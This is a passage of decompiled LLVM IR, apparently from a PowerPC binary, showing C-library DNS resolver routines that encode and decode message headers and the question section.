  %v1_10014f4c = icmp slt i32 %v2_10014f48, 8
  %v3_10014f4c = icmp eq i32 %v2_10014f48, 8
  store i1 %v1_10014f4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014f4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014f4c, label %dec_label_pc_10014f54, label %dec_label_pc_10014f60

dec_label_pc_10014f54:                            ; preds = %dec_label_pc_10014f48
  %v3_10014f58 = inttoptr i32 %v2_10014f58 to i8*
  store i8 58, i8* %v3_10014f58, align 1
  %v0_10014f5c = load i32, i32* %r29.global-to-local, align 4
  %v1_10014f5c = add i32 %v0_10014f5c, 1
  store i32 %v1_10014f5c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f60

dec_label_pc_10014f60:                            ; preds = %dec_label_pc_10014f48, %dec_label_pc_10014f40, %dec_label_pc_10014f54
  %v2_10014f74 = phi i32 [ %v2_10014f58, %dec_label_pc_10014f48 ], [ %v2_10014e8c51, %dec_label_pc_10014f40 ], [ %v1_10014f5c, %dec_label_pc_10014f54 ]
  %v1_10014f60 = sub i32 1, %v2_10014e5c
  %v2_10014f68 = add i32 %v1_10014f60, %v2_10014f74
  %v1_10014f6c = load i32, i32* @r26, align 4
  %v2_10014f6c = icmp ult i32 %v2_10014f68, %v1_10014f6c
  %v4_10014f6c = icmp eq i32 %v2_10014f68, %v1_10014f6c
  store i1 %v2_10014f6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014f6c, i1* %cr7_eq.global-to-local, align 1
  %v3_10014f74 = inttoptr i32 %v2_10014f74 to i8*
  store i8 0, i8* %v3_10014f74, align 1
  %v0_10014f78 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10014f78 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10014f78 = or i1 %v0_10014f78, %v1_10014f78
  br i1 %v2_10014f78, label %dec_label_pc_10014f90, label %dec_label_pc_10014f7c

dec_label_pc_10014f7c:                            ; preds = %dec_label_pc_10014f60
  %v0_10014f7c = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014f88 = inttoptr i32 %v0_10014f7c to i32*
  store i32 28, i32* %v2_10014f88, align 4
  %v0_10014fb4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fb0

dec_label_pc_10014f90:                            ; preds = %dec_label_pc_10014f60
  %v0_10014f90 = load i32, i32* @r25, align 4
  %v2_10014f94 = bitcast i32* %stack_var_-88 to i8*
  %v3_10014f94 = call i32 @strcpy(i32 %v0_10014f90, i8* %v2_10014f94)
  br label %dec_label_pc_10014f98

dec_label_pc_10014f98:                            ; preds = %dec_label_pc_10014d54, %dec_label_pc_10014f90
  %storemerge1 = phi i32 [ %v3_10014d60, %dec_label_pc_10014d54 ], [ %v3_10014f94, %dec_label_pc_10014f90 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fb0

dec_label_pc_10014fa0:                            ; preds = %dec_label_pc_10014d48
  %v0_10014fa0 = call i32 @__errno_location()
  %v2_10014fa8 = inttoptr i32 %v0_10014fa0 to i32*
  store i32 97, i32* %v2_10014fa8, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fb0

dec_label_pc_10014fb0:                            ; preds = %dec_label_pc_10014ee0, %dec_label_pc_10014f98, %dec_label_pc_10014f7c, %dec_label_pc_10014fa0
  %v0_10014fb4 = phi i32 [ 0, %dec_label_pc_10014ee0 ], [ %storemerge1, %dec_label_pc_10014f98 ], [ %v0_10014fb4.pre, %dec_label_pc_10014f7c ], [ 0, %dec_label_pc_10014fa0 ]
  ret i32 %v0_10014fb4

; uselistorder directives
  uselistorder i32 %v2_10014f74, { 1, 0 }
  uselistorder i32 %v2_10014f48, { 1, 0 }
  uselistorder i1 %v3_10014e68, { 0, 2, 1 }
  uselistorder i32 %v0_10014e68, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10014f34, { 2, 1, 0 }
  uselistorder i32 %v0_10014eec66, { 1, 0 }
  uselistorder i32 %v3_10014ef0, { 1, 0 }
  uselistorder i32 %v0_10014ebc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014eac.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10014ea8, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10014e78, { 1, 0 }
  uselistorder i32 %v0_10014e98, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10014e78, { 0, 2, 1 }
  uselistorder i32 %v2_10014ea4, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10014e683, { 0, 2, 1 }
  uselistorder i32 %v0_10014e50, { 2, 1, 0 }
  uselistorder i32 %v0_10014e40.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10014e48, { 1, 0, 2 }
  uselistorder i32 %v1_10014e24, { 2, 1, 0 }
  uselistorder i32 %v1_10014e20, { 1, 0 }
  uselistorder i32 %v0_10014e0439, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_10014e1442, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10014dd8, { 1, 0 }
  uselistorder i32 %v0_10014e20, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10014dd8, { 1, 0 }
  uselistorder i32 %v0_10014e04, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10014e14, { 2, 3, 0, 1 }
  uselistorder i32 %v1_10014db4, { 1, 0 }
  uselistorder i32 %v2_10014dac, { 1, 0 }
  uselistorder i32 %v0_10014da4, { 1, 0, 2 }
  uselistorder i32 %v1_10014d8c, { 1, 0 }
  uselistorder i32 %v2_10014d68, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 16, 9, 10, 17, 12, 18, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 9, 6, 0, 7, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 10, 0, 11, 15, 16, 12, 13, 14, 5, 6, 7, 8, 9, 17 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 29, 28, 13, 0, 4, 3, 12, 1, 7, 2, 11, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 10, 9, 8, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10014fb0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10014f98, { 1, 0 }
  uselistorder label %dec_label_pc_10014f60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014f34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014f10, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10014e68, { 1, 0 }
  uselistorder label %dec_label_pc_10014e5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014e40, { 1, 0 }
  uselistorder label %dec_label_pc_10014e20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10014dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10014d8c, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_100150ac, label %dec_label_pc_10014fd4

dec_label_pc_10014fd4:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10014fd4 = add i32 %tmp, 2
  %v2_10014fd4 = inttoptr i32 %v1_10014fd4 to i8*
  %v3_10014fd4 = load i8, i8* %v2_10014fd4, align 1
  %v4_10014fd4 = zext i8 %v3_10014fd4 to i32
  store i32 %v4_10014fd4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10014fd4, i8* %tmp3, align 1
  %v2_10014fe0 = load i32, i32* %arg1, align 4
  store i32 %v2_10014fe0, i32* %r0.global-to-local, align 4
  %v1_10014fe4 = trunc i32 %v2_10014fe0 to i8
  %v4_10014fe4 = add i32 %arg2, 1
  %v5_10014fe4 = inttoptr i32 %v4_10014fe4 to i8*
  store i8 %v1_10014fe4, i8* %v5_10014fe4, align 1
  %v1_10014fe8 = add i32 %tmp, 12
  %v2_10014fe8 = inttoptr i32 %v1_10014fe8 to i32*
  %v3_10014fe8 = load i32, i32* %v2_10014fe8, align 4
  store i32 %v3_10014fe8, i32* %r0.global-to-local, align 4
  %v1_10014fec = add i32 %tmp, 16
  %v2_10014fec = inttoptr i32 %v1_10014fec to i32*
  %v3_10014fec = load i32, i32* %v2_10014fec, align 4
  store i32 %v3_10014fec, i32* %r11.global-to-local, align 4
  %v1_10014ff0 = add i32 %tmp, 4
  %v2_10014ff0 = inttoptr i32 %v1_10014ff0 to i32*
  %v3_10014ff0 = load i32, i32* %v2_10014ff0, align 4
  %v2_10014ff4 = icmp ne i32 %v3_10014fe8, 0
  %v5_10014ff8 = zext i1 %v2_10014ff4 to i32
  store i32 %v5_10014ff8, i32* %r10.global-to-local, align 4
  %v1_10014ffc = add i32 %tmp, 8
  %v2_10014ffc = inttoptr i32 %v1_10014ffc to i32*
  %v3_10014ffc = load i32, i32* %v2_10014ffc, align 4
  %v2_10015000 = icmp ne i32 %v3_10014fec, 0
  %v5_10015004 = zext i1 %v2_10015000 to i32
  %v1_10015008 = add i32 %tmp, 20
  %v2_10015008 = inttoptr i32 %v1_10015008 to i32*
  %v3_10015008 = load i32, i32* %v2_10015008, align 4
  store i32 %v3_10015008, i32* %r0.global-to-local, align 4
  %not.v2_1001500c = icmp eq i32 %v3_10014ff0, 0
  %v6_10015010 = sext i1 %not.v2_1001500c to i32
  store i32 %v5_10015004, i32* %r11.global-to-local, align 4
  %v1_10015018 = call i32 @__asm_rlwinm(i32 %v6_10015010, i32 0, i32 24, i32 24)
  %v0_1001501c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001501c = mul i32 %v0_1001501c, 4
  store i32 %v1_1001501c, i32* %r10.global-to-local, align 4
  %v1_10015020 = call i32 @__asm_rlwinm(i32 %v3_10014ffc, i32 3, i32 25, i32 28)
  %v0_10015024 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015024 = icmp ne i32 %v0_10015024, 0
  %v5_10015028 = zext i1 %v2_10015024 to i32
  %v2_1001502c = or i32 %v1_1001501c, %v1_10015020
  store i32 %v2_1001502c, i32* %r10.global-to-local, align 4
  %v1_10015030 = add i32 %v1_10015018, 128
  %v0_10015034 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015034 = mul i32 %v0_10015034, 2
  store i32 %v1_10015034, i32* %r11.global-to-local, align 4
  %v2_10015038 = or i32 %v2_1001502c, %v5_10015028
  store i32 %v2_10015038, i32* %r0.global-to-local, align 4
  %v2_1001503c = or i32 %v2_10015038, %v1_10015030
  %v2_10015040 = or i32 %v2_1001503c, %v1_10015034
  %v1_10015044 = trunc i32 %v2_10015040 to i8
  %v4_10015044 = add i32 %arg2, 2
  %v5_10015044 = inttoptr i32 %v4_10015044 to i8*
  store i8 %v1_10015044, i8* %v5_10015044, align 1
  %v1_10015048 = add i32 %tmp, 24
  %v2_10015048 = inttoptr i32 %v1_10015048 to i32*
  %v3_10015048 = load i32, i32* %v2_10015048, align 4
  %v1_1001504c = add i32 %tmp, 28
  %v2_1001504c = inttoptr i32 %v1_1001504c to i32*
  %v3_1001504c = load i32, i32* %v2_1001504c, align 4
  store i32 %v3_1001504c, i32* %r0.global-to-local, align 4
  %not.v2_10015050 = icmp eq i32 %v3_10015048, 0
  %v6_10015054 = sext i1 %not.v2_10015050 to i32
  %v1_10015058 = call i32 @__asm_rlwinm(i32 %v6_10015054, i32 0, i32 24, i32 24)
  %v1_1001505c = urem i32 %v3_1001504c, 16
  store i32 %v1_1001505c, i32* %r0.global-to-local, align 4
  %v1_10015060 = add i32 %v1_10015058, 128
  %v2_10015064 = or i32 %v1_1001505c, %v1_10015060
  %v1_10015068 = trunc i32 %v2_10015064 to i8
  %v4_10015068 = add i32 %arg2, 3
  %v5_10015068 = inttoptr i32 %v4_10015068 to i8*
  store i8 %v1_10015068, i8* %v5_10015068, align 1
  %v1_1001506c = add i32 %tmp, 34
  %v2_1001506c = inttoptr i32 %v1_1001506c to i8*
  %v3_1001506c = load i8, i8* %v2_1001506c, align 1
  %v4_1001506c = zext i8 %v3_1001506c to i32
  store i32 %v4_1001506c, i32* %r0.global-to-local, align 4
  %v4_10015070 = add i32 %arg2, 4
  %v5_10015070 = inttoptr i32 %v4_10015070 to i8*
  store i8 %v3_1001506c, i8* %v5_10015070, align 1
  %v1_10015074 = add i32 %tmp, 32
  %v2_10015074 = inttoptr i32 %v1_10015074 to i32*
  %v3_10015074 = load i32, i32* %v2_10015074, align 4
  store i32 %v3_10015074, i32* %r0.global-to-local, align 4
  %v1_10015078 = trunc i32 %v3_10015074 to i8
  %v4_10015078 = add i32 %arg2, 5
  %v5_10015078 = inttoptr i32 %v4_10015078 to i8*
  store i8 %v1_10015078, i8* %v5_10015078, align 1
  %v1_1001507c = add i32 %tmp, 38
  %v2_1001507c = inttoptr i32 %v1_1001507c to i8*
  %v3_1001507c = load i8, i8* %v2_1001507c, align 1
  %v4_1001507c = zext i8 %v3_1001507c to i32
  store i32 %v4_1001507c, i32* %r0.global-to-local, align 4
  %v4_10015080 = add i32 %arg2, 6
  %v5_10015080 = inttoptr i32 %v4_10015080 to i8*
  store i8 %v3_1001507c, i8* %v5_10015080, align 1
  %v1_10015084 = add i32 %tmp, 36
  %v2_10015084 = inttoptr i32 %v1_10015084 to i32*
  %v3_10015084 = load i32, i32* %v2_10015084, align 4
  store i32 %v3_10015084, i32* %r0.global-to-local, align 4
  %v1_10015088 = trunc i32 %v3_10015084 to i8
  %v4_10015088 = add i32 %arg2, 7
  %v5_10015088 = inttoptr i32 %v4_10015088 to i8*
  store i8 %v1_10015088, i8* %v5_10015088, align 1
  %v1_1001508c = add i32 %tmp, 42
  %v2_1001508c = inttoptr i32 %v1_1001508c to i8*
  %v3_1001508c = load i8, i8* %v2_1001508c, align 1
  %v4_1001508c = zext i8 %v3_1001508c to i32
  store i32 %v4_1001508c, i32* %r0.global-to-local, align 4
  %v4_10015090 = add i32 %arg2, 8
  %v5_10015090 = inttoptr i32 %v4_10015090 to i8*
  store i8 %v3_1001508c, i8* %v5_10015090, align 1
  %v1_10015094 = add i32 %tmp, 40
  %v2_10015094 = inttoptr i32 %v1_10015094 to i32*
  %v3_10015094 = load i32, i32* %v2_10015094, align 4
  store i32 %v3_10015094, i32* %r0.global-to-local, align 4
  %v1_10015098 = trunc i32 %v3_10015094 to i8
  %v4_10015098 = add i32 %arg2, 9
  %v5_10015098 = inttoptr i32 %v4_10015098 to i8*
  store i8 %v1_10015098, i8* %v5_10015098, align 1
  %v1_1001509c = add i32 %tmp, 46
  %v2_1001509c = inttoptr i32 %v1_1001509c to i8*
  %v3_1001509c = load i8, i8* %v2_1001509c, align 1
  %v4_1001509c = zext i8 %v3_1001509c to i32
  store i32 %v4_1001509c, i32* %r0.global-to-local, align 4
  %v4_100150a0 = add i32 %arg2, 10
  %v5_100150a0 = inttoptr i32 %v4_100150a0 to i8*
  store i8 %v3_1001509c, i8* %v5_100150a0, align 1
  %v1_100150a4 = add i32 %tmp, 44
  %v2_100150a4 = inttoptr i32 %v1_100150a4 to i32*
  %v3_100150a4 = load i32, i32* %v2_100150a4, align 4
  store i32 %v3_100150a4, i32* %r0.global-to-local, align 4
  %v1_100150a8 = trunc i32 %v3_100150a4 to i8
  %v4_100150a8 = add i32 %arg2, 11
  %v5_100150a8 = inttoptr i32 %v4_100150a8 to i8*
  store i8 %v1_100150a8, i8* %v5_100150a8, align 1
  %v0_100150ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100150ac

dec_label_pc_100150ac:                            ; preds = %entry, %dec_label_pc_10014fd4
  %v0_100150ac = phi i32 [ -1, %entry ], [ %v0_100150ac.pre, %dec_label_pc_10014fd4 ]
  ret i32 %v0_100150ac

; uselistorder directives
  uselistorder i32 %v1_1001505c, { 1, 0 }
  uselistorder i32 %v1_10015034, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 38, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100150ac, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100150b4 = load i8, i8* %arg1, align 1
  %v4_100150b4 = zext i8 %v3_100150b4 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100150bc = add i32 %tmp, 1
  %v3_100150bc = inttoptr i32 %v2_100150bc to i8*
  %v4_100150bc = load i8, i8* %v3_100150bc, align 1
  %v5_100150bc = zext i8 %v4_100150bc to i32
  %v1_100150c4 = mul nuw nsw i32 %v4_100150b4, 256
  %v2_100150c8 = or i32 %v5_100150bc, %v1_100150c4
  %v2_100150cc = inttoptr i32 %arg2 to i32*
  store i32 %v2_100150c8, i32* %v2_100150cc, align 4
  %v0_100150d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100150d0 = add i32 %v0_100150d0, 2
  %v2_100150d0 = inttoptr i32 %v1_100150d0 to i8*
  %v3_100150d0 = load i8, i8* %v2_100150d0, align 1
  %v4_100150d0 = zext i8 %v3_100150d0 to i32
  %v1_100150d4 = call i32 @__asm_rlwinm(i32 %v4_100150d0, i32 25, i32 31, i32 31)
  %v2_100150d8 = add i32 %arg2, 4
  %v3_100150d8 = inttoptr i32 %v2_100150d8 to i32*
  store i32 %v1_100150d4, i32* %v3_100150d8, align 4
  %v0_100150dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100150dc = add i32 %v0_100150dc, 2
  %v2_100150dc = inttoptr i32 %v1_100150dc to i8*
  %v3_100150dc = load i8, i8* %v2_100150dc, align 1
  %v4_100150dc = zext i8 %v3_100150dc to i32
  %v1_100150e0 = call i32 @__asm_rlwinm(i32 %v4_100150dc, i32 29, i32 28, i32 31)
  %v2_100150e4 = add i32 %arg2, 8
  %v3_100150e4 = inttoptr i32 %v2_100150e4 to i32*
  store i32 %v1_100150e0, i32* %v3_100150e4, align 4
  %v0_100150e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100150e8 = add i32 %v0_100150e8, 2
  %v2_100150e8 = inttoptr i32 %v1_100150e8 to i8*
  %v3_100150e8 = load i8, i8* %v2_100150e8, align 1
  %v4_100150e8 = zext i8 %v3_100150e8 to i32
  %v1_100150ec = call i32 @__asm_rlwinm(i32 %v4_100150e8, i32 30, i32 31, i32 31)
  %v2_100150f0 = add i32 %arg2, 12
  %v3_100150f0 = inttoptr i32 %v2_100150f0 to i32*
  store i32 %v1_100150ec, i32* %v3_100150f0, align 4
  %v0_100150f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100150f4 = add i32 %v0_100150f4, 2
  %v2_100150f4 = inttoptr i32 %v1_100150f4 to i8*
  %v3_100150f4 = load i8, i8* %v2_100150f4, align 1
  %v4_100150f4 = zext i8 %v3_100150f4 to i32
  %v1_100150f8 = call i32 @__asm_rlwinm(i32 %v4_100150f4, i32 31, i32 31, i32 31)
  %v2_100150fc = add i32 %arg2, 16
  %v3_100150fc = inttoptr i32 %v2_100150fc to i32*
  store i32 %v1_100150f8, i32* %v3_100150fc, align 4
  %v0_10015100 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015100 = add i32 %v0_10015100, 2
  %v2_10015100 = inttoptr i32 %v1_10015100 to i8*
  %v3_10015100 = load i8, i8* %v2_10015100, align 1
  %tmp1 = urem i8 %v3_10015100, 2
  %v1_10015104 = zext i8 %tmp1 to i32
  %v2_10015108 = add i32 %arg2, 20
  %v3_10015108 = inttoptr i32 %v2_10015108 to i32*
  store i32 %v1_10015104, i32* %v3_10015108, align 4
  %v0_1001510c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001510c = add i32 %v0_1001510c, 3
  %v2_1001510c = inttoptr i32 %v1_1001510c to i8*
  %v3_1001510c = load i8, i8* %v2_1001510c, align 1
  %v4_1001510c = zext i8 %v3_1001510c to i32
  %v1_10015110 = call i32 @__asm_rlwinm(i32 %v4_1001510c, i32 25, i32 31, i32 31)
  %v2_10015114 = add i32 %arg2, 24
  %v3_10015114 = inttoptr i32 %v2_10015114 to i32*
  store i32 %v1_10015110, i32* %v3_10015114, align 4
  %v0_10015118 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015118 = add i32 %v0_10015118, 3
  %v2_10015118 = inttoptr i32 %v1_10015118 to i8*
  %v3_10015118 = load i8, i8* %v2_10015118, align 1
  %tmp2 = urem i8 %v3_10015118, 16
  %v1_1001511c = zext i8 %tmp2 to i32
  %v2_10015120 = add i32 %arg2, 28
  %v3_10015120 = inttoptr i32 %v2_10015120 to i32*
  store i32 %v1_1001511c, i32* %v3_10015120, align 4
  %v0_10015124 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015124 = add i32 %v0_10015124, 4
  %v2_10015124 = inttoptr i32 %v1_10015124 to i8*
  %v3_10015124 = load i8, i8* %v2_10015124, align 1
  %v4_10015124 = zext i8 %v3_10015124 to i32
  %v1_10015128 = add i32 %v0_10015124, 5
  %v2_10015128 = inttoptr i32 %v1_10015128 to i8*
  %v3_10015128 = load i8, i8* %v2_10015128, align 1
  %v4_10015128 = zext i8 %v3_10015128 to i32
  %v1_1001512c = mul nuw nsw i32 %v4_10015124, 256
  %v2_10015130 = or i32 %v4_10015128, %v1_1001512c
  %v2_10015134 = add i32 %arg2, 32
  %v3_10015134 = inttoptr i32 %v2_10015134 to i32*
  store i32 %v2_10015130, i32* %v3_10015134, align 4
  %v0_10015138 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015138 = add i32 %v0_10015138, 6
  %v2_10015138 = inttoptr i32 %v1_10015138 to i8*
  %v3_10015138 = load i8, i8* %v2_10015138, align 1
  %v4_10015138 = zext i8 %v3_10015138 to i32
  %v1_1001513c = add i32 %v0_10015138, 7
  %v2_1001513c = inttoptr i32 %v1_1001513c to i8*
  %v3_1001513c = load i8, i8* %v2_1001513c, align 1
  %v4_1001513c = zext i8 %v3_1001513c to i32
  %v1_10015140 = mul nuw nsw i32 %v4_10015138, 256
  %v2_10015144 = or i32 %v4_1001513c, %v1_10015140
  %v2_10015148 = add i32 %arg2, 36
  %v3_10015148 = inttoptr i32 %v2_10015148 to i32*
  store i32 %v2_10015144, i32* %v3_10015148, align 4
  %v0_1001514c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001514c = add i32 %v0_1001514c, 8
  %v2_1001514c = inttoptr i32 %v1_1001514c to i8*
  %v3_1001514c = load i8, i8* %v2_1001514c, align 1
  %v4_1001514c = zext i8 %v3_1001514c to i32
  %v1_10015150 = add i32 %v0_1001514c, 9
  %v2_10015150 = inttoptr i32 %v1_10015150 to i8*
  %v3_10015150 = load i8, i8* %v2_10015150, align 1
  %v4_10015150 = zext i8 %v3_10015150 to i32
  %v1_10015154 = mul nuw nsw i32 %v4_1001514c, 256
  %v2_10015158 = or i32 %v4_10015150, %v1_10015154
  %v2_1001515c = add i32 %arg2, 40
  %v3_1001515c = inttoptr i32 %v2_1001515c to i32*
  store i32 %v2_10015158, i32* %v3_1001515c, align 4
  %v0_10015160 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015160 = add i32 %v0_10015160, 10
  %v2_10015160 = inttoptr i32 %v1_10015160 to i8*
  %v3_10015160 = load i8, i8* %v2_10015160, align 1
  %v4_10015160 = zext i8 %v3_10015160 to i32
  %v1_10015164 = add i32 %v0_10015160, 11
  %v2_10015164 = inttoptr i32 %v1_10015164 to i8*
  %v3_10015164 = load i8, i8* %v2_10015164, align 1
  %v4_10015164 = zext i8 %v3_10015164 to i32
  store i32 %v4_10015164, i32* %r9.global-to-local, align 4
  %v1_10015168 = mul nuw nsw i32 %v4_10015160, 256
  %v2_1001516c = or i32 %v4_10015164, %v1_10015168
  %v2_10015170 = add i32 %arg2, 44
  %v3_10015170 = inttoptr i32 %v2_10015170 to i32*
  store i32 %v2_1001516c, i32* %v3_10015170, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 10, 11, 12, 13, 14, 17, 16, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 11, { 7, 8, 9, 16, 3, 10, 0, 1, 11, 12, 13, 14, 15, 2, 5, 4, 6 }
  uselistorder i32 7, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4 }
  uselistorder i32 5, { 17, 18, 8, 9, 10, 2, 3, 11, 0, 12, 13, 1, 19, 20, 4, 14, 15, 5, 6, 7, 16 }
  uselistorder i8 2, { 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 30, { 8, 6, 9, 10, 11, 12, 1, 2, 3, 0, 7, 13, 4, 5, 14, 15, 16, 17 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10015194 = load i32, i32* %arg1, align 4
  store i32 %v2_10015194, i32* %r3.global-to-local, align 4
  store i32 268521884, i32* @lr, align 4
  %v1_10015198 = inttoptr i32 %v2_10015194 to i8*
  %v2_10015198 = call i32 @__encode_dotted(i8* %v1_10015198)
  store i32 %v2_10015198, i32* %r3.global-to-local, align 4
  %v1_1001519c = icmp slt i32 %v2_10015198, 0
  %v1_100151a0 = load i32, i32* @r29, align 4
  %v2_100151a0 = sub i32 %v1_100151a0, %v2_10015198
  store i32 %v2_100151a0, i32* @r29, align 4
  br i1 %v1_1001519c, label %dec_label_pc_100151e0, label %dec_label_pc_100151ac

dec_label_pc_100151ac:                            ; preds = %entry
  %v2_100151a4 = icmp sgt i32 %v2_100151a0, 3
  %v0_100151ac = load i32, i32* @r30, align 4
  %v2_100151ac = add i32 %v0_100151ac, %v2_10015198
  store i32 %v2_100151ac, i32* %r9.global-to-local, align 4
  br i1 %v2_100151a4, label %dec_label_pc_100151bc, label %dec_label_pc_100151b4

dec_label_pc_100151b4:                            ; preds = %dec_label_pc_100151ac
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100151e0

dec_label_pc_100151bc:                            ; preds = %dec_label_pc_100151ac
  %v0_100151bc = load i32, i32* @r31, align 4
  %v1_100151bc = add i32 %v0_100151bc, 6
  %v2_100151bc = inttoptr i32 %v1_100151bc to i8*
  %v3_100151bc = load i8, i8* %v2_100151bc, align 1
  %v5_100151c0 = inttoptr i32 %v2_100151ac to i8*
  store i8 %v3_100151bc, i8* %v5_100151c0, align 1
  %v0_100151c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100151c4 = add i32 %v0_100151c4, 4
  store i32 %v1_100151c4, i32* %r3.global-to-local, align 4
  %v0_100151c8 = load i32, i32* @r31, align 4
  %v1_100151c8 = add i32 %v0_100151c8, 4
  %v2_100151c8 = inttoptr i32 %v1_100151c8 to i32*
  %v3_100151c8 = load i32, i32* %v2_100151c8, align 4
  %v1_100151cc = trunc i32 %v3_100151c8 to i8
  %v2_100151cc = load i32, i32* %r9.global-to-local, align 4
  %v3_100151cc = add i32 %v2_100151cc, 1
  %v4_100151cc = inttoptr i32 %v3_100151cc to i8*
  store i8 %v1_100151cc, i8* %v4_100151cc, align 1
  %v0_100151d0 = load i32, i32* @r31, align 4
  %v1_100151d0 = add i32 %v0_100151d0, 10
  %v2_100151d0 = inttoptr i32 %v1_100151d0 to i8*
  %v3_100151d0 = load i8, i8* %v2_100151d0, align 1
  %v2_100151d4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100151d4 = add i32 %v2_100151d4, 2
  %v4_100151d4 = inttoptr i32 %v3_100151d4 to i8*
  store i8 %v3_100151d0, i8* %v4_100151d4, align 1
  %v0_100151d8 = load i32, i32* @r31, align 4
  %v1_100151d8 = add i32 %v0_100151d8, 8
  %v2_100151d8 = inttoptr i32 %v1_100151d8 to i32*
  %v3_100151d8 = load i32, i32* %v2_100151d8, align 4
  %v1_100151dc = trunc i32 %v3_100151d8 to i8
